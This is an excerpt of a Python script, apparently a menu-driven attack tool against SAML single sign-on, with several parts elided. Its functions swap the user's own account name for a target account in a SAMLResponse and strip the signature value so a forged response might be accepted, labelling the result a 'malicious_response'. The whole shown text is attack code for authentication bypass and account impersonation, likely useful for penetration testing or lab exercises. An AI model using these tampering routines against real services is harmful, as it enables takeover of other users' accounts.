...
def SAMLtemper_account(base64_message, own_account, target_account): 
	malicious_response = base64_message.replace(own_account,target_account)
	return malicious_response


def SAMLtemper_signature(malicious_response): 
	malicious_response_without_signature = re.sub("<ds:SignatureValue>.*?</ds:SignatureValue>","<ds:SignatureValue></ds:SignatureValue>", malicious_response)
	return malicious_response_without_signature
...
def main():
	...
	while (choice == '0'):
		...
		if choice == "1":
			...
			print("The new SAMLResponse:", parsed_response)
			break
		elif choice == "2":
			own_account, target_account = SAMLRequest_Accounts()
			malicious_response = SAMLtemper_account(base64_message,own_account,target_account)
